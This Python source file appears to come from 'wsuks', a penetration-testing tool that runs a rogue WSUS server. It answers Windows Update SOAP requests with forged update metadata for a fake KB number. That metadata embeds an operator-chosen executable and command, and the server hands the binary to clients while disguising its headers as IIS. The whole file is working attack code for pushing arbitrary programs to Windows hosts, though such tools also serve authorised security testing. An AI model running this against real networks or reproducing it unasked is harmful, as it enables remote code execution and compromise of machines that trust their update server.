from http.server import BaseHTTPRequestHandler
import logging
import traceback
from bs4 import BeautifulSoup
from random import randint
import uuid
import html
import datetime
import base64
import hashlib
import sys
import os
import wsuks


class WSUSUpdateHandler:
    """
    Handling incoming HTTP requests for WSUS server.
    Mostly inspired by https://github.com/GoSecure/pywsus
    """

    def __init__(self, executable_file, executable_name, client_address):
        self.logger = logging.getLogger("wsuks")

        self.get_config_xml = ""
        self.get_cookie_xml = ""
        self.register_computer_xml = ""
        self.sync_updates_xml = ""
        self.get_extended_update_info_xml = ""
        self.report_event_batch_xml = ""
        self.get_authorization_cookie_xml = ""

        self.revision_ids = [randint(900000, 999999), randint(900000, 999999)]
        self.deployment_ids = [randint(80000, 99999), randint(80000, 99999)]
        self.uuids = [uuid.uuid4(), uuid.uuid4()]
        self.kb_number = randint(1000000, 9999999)

        self.executable = executable_file
        self.executable_name = executable_name
        self.command = ""
        self.sha1 = ""
        self.sha256 = ""

        self.client_address = client_address

        self.set_filedigest()

    def get_last_change(self):
        return (datetime.datetime.now() - datetime.timedelta(days=3)).isoformat()

    def get_cookie(self):
        return base64.b64encode(b"A" * 47).decode("utf-8")

    def get_expire(self):
        return (datetime.datetime.now() + datetime.timedelta(minutes=10)).isoformat()

    def set_resources_xml(self, command):
        self.command = command
        # init resources

        path = os.path.abspath(os.path.dirname(wsuks.__file__))

        try:
            with open(f"{path}/xml_files/get-config.xml") as file:
                self.get_config_xml = file.read().format(lastChange=self.get_last_change())
                file.close()

            with open(f"{path}/xml_files/get-cookie.xml") as file:
                self.get_cookie_xml = file.read().format(expire=self.get_expire(), cookie=self.get_cookie())
                file.close()

            with open(f"{path}/xml_files/register-computer.xml") as file:
                self.register_computer_xml = file.read()
                file.close()

            with open(f"{path}/xml_files/sync-updates.xml") as file:
                self.sync_updates_xml = file.read().format(revision_id1=self.revision_ids[0],
                                                           revision_id2=self.revision_ids[1],
                                                           deployment_id1=self.deployment_ids[0],
                                                           deployment_id2=self.deployment_ids[1],
                                                           uuid1=self.uuids[0],
                                                           uuid2=self.uuids[1],
                                                           expire=self.get_expire(),
                                                           cookie=self.get_cookie())
                file.close()

            with open(f"{path}/xml_files/get-extended-update-info.xml") as file:
                self.get_extended_update_info_xml = file.read().format(revision_id1=self.revision_ids[0],
                                                                       revision_id2=self.revision_ids[1],
                                                                       kb_number=self.kb_number,
                                                                       sha1=self.sha1,
                                                                       sha256=self.sha256,
                                                                       filename=self.executable_name,
                                                                       file_size=len(self.executable),
                                                                       command=html.escape(html.escape(self.command)),
                                                                       url=f"http://{self.client_address}/{uuid.uuid4()}/{self.executable_name}")
                file.close()

            with open(f"{path}/xml_files/report-event-batch.xml") as file:
                self.report_event_batch_xml = file.read()
                file.close()

            with open(f"{path}/xml_files/get-authorization-cookie.xml") as file:
                self.get_authorization_cookie_xml = file.read().format(cookie=self.get_cookie())
                file.close()

        except Exception as err:
            self.logger.error(f"Error: {err}")
            if self.logger.level == logging.DEBUG:
                traceback.print_exc()
            sys.exit(1)

    def set_filedigest(self):
        hash1 = hashlib.sha1()
        hash256 = hashlib.sha256()
        try:
            data = self.executable
            hash1.update(data)
            hash256.update(data)
            self.sha1 = base64.b64encode(hash1.digest()).decode()
            self.sha256 = base64.b64encode(hash256.digest()).decode()

        except Exception as err:
            self.logger.error(f"Error in set_filedigest: {err}")
            if self.logger.level == logging.DEBUG:
                traceback.print_exc()
            sys.exit(1)

    def __str__(self):
        return f"The update metadata - uuids: {self.uuids}, revision_ids: {self.revision_ids}, deployment_ids: {self.deployment_ids}, executable: {self.executable_name}, sha1: {self.sha1}, sha256: {self.sha256}, command: {self.command}"


class WSUSBaseServer(BaseHTTPRequestHandler):
    def __init__(self, wsusUpdateHandler, *args, **kwargs):
        self.logger = logging.getLogger("wsuks")
        self.wsusUpdateHandler = wsusUpdateHandler
        super().__init__(*args, **kwargs)

    def _set_response(self, serveEXE=False):
        self.protocol_version = "HTTP/1.1"
        self.send_response(200)
        self.server_version = "Microsoft-IIS/10.0"
        self.send_header("Cache-Control", "private")

        if serveEXE:
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", len(self.wsusUpdateHandler.executable))
        else:
            self.send_header("Content-type", "text/xml; chartset=utf-8")

        self.send_header("X-AspNet-Version", "4.0.30319")
        self.send_header("X-Powered-By", "ASP.NET")
        self.end_headers()

    def do_HEAD(self):
        self.logger.success(f"Received HEAD request: {self.path}")
        self.logger.debug(f"HEAD request,\nPath: {self.path}\nHeaders:\n{self.headers}\n")

        if self.path.find(".exe"):
            self.logger.success(f"HEAD request for exe: {self.path}")

            self._set_response(True)

    def do_GET(self):
        self.logger.success(f"Received GET request: {self.path}")
        self.logger.debug(f"GET request,\nPath: {self.path}\nHeaders:\n{self.headers}\n")

        if self.path.find(".exe"):
            self.logger.success(f"GET request for exe: {self.path}")

            self._set_response(True)
            self.wfile.write(self.wsusUpdateHandler.executable)

    def do_POST(self):
        content_length = int(self.headers["Content-Length"])
        post_data = self.rfile.read(content_length)

        post_data_xml = BeautifulSoup(post_data, "xml")
        data = None

        soap_action = self.headers["SOAPAction"]

        self.logger.success(f"Received POST request: {self.path}, SOAP Action: {soap_action}")
        self.logger.debug(f"POST Request,\nPath: {self.path}\nHeaders:\n{self.headers}\n\nBody:\n{post_data_xml.encode_contents()}\n")

        if soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetConfig"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/b76899b4-ad55-427d-a748-2ecf0829412b
            data = BeautifulSoup(self.wsusUpdateHandler.get_config_xml, "xml")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetCookie"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/36a5d99a-a3ca-439d-bcc5-7325ff6b91e2
            data = BeautifulSoup(self.wsusUpdateHandler.get_cookie_xml, "xml")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/RegisterComputer"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/b0f2a41f-4b96-42a5-b84f-351396293033
            data = BeautifulSoup(self.wsusUpdateHandler.register_computer_xml, "xml")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/SyncUpdates"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/6b654980-ae63-4b0d-9fae-2abb516af894
            data = BeautifulSoup(self.wsusUpdateHandler.sync_updates_xml, "xml")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/ClientWebService/GetExtendedUpdateInfo"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/862adc30-a9be-4ef7-954c-13934d8c1c77
            data = BeautifulSoup(self.wsusUpdateHandler.get_extended_update_info_xml, "xml")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/ReportEventBatch"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/da9f0561-1e57-4886-ad05-57696ec26a78
            data = BeautifulSoup(self.wsusUpdateHandler.report_event_batch_xml, "xml")

            post_data_report = BeautifulSoup(post_data, "xml")
            self.logger.debug(f"Client Report: {post_data_report.TargetID.text}, {post_data_report.ComputerBrand.text}, {post_data_report.ComputerModel.text}, {post_data_report.ExtendedData.ReplacementStrings.string}.")

        elif soap_action == '"http://www.microsoft.com/SoftwareDistribution/Server/SimpleAuthWebService/GetAuthorizationCookie"':
            # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wusp/44767c55-1e41-4589-aa01-b306e0134744
            data = BeautifulSoup(self.wsusUpdateHandler.get_authorization_cookie_xml, "xml")

        else:
            self.logger.warning(f"SOAP Action not handled: {soap_action}")
            return

        self._set_response()
        self.wfile.write(data.encode_contents())

        if data is not None:
            self.logger.debug(f"POST Response,\nPath: {self.path}\nHeaders:\n{self.headers}\n\nBody:\n{data.encode_contents}\n")
        else:
            self.logger.warning("POST Response without data.")

    def log_message(self, format, *args):  # noqa: A002
        return
